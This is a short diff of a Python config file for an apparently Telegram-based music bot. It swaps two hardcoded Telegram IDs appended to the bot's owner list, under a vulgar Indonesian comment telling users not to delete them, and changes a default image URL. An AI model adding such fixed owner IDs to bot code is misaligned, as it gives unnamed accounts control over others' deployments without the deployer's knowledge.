@@ -48,8 +48,8 @@ OWNER_ID = list(
 )  # Input type must be interger
 
 # JANGAN HAPUS YA KONTOL
-OWNER_ID.append(1224143544)
-OWNER_ID.append(2012224978)
+OWNER_ID.append(5460673407)
+OWNER_ID.append(1784606556)
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
@@ -168,7 +168,7 @@ autoclean = []
 
 
 # Images
-START_IMG_URL = getenv("START_IMG_URL", "https://telegra.ph/file/abcd750ea55ec0b2d817e.jpg")
+START_IMG_URL = getenv("START_IMG_URL", "https://telegra.ph/file/d439c793e33c64642722f.jpg")
 
 PING_IMG_URL = getenv(
     "PING_IMG_URL",
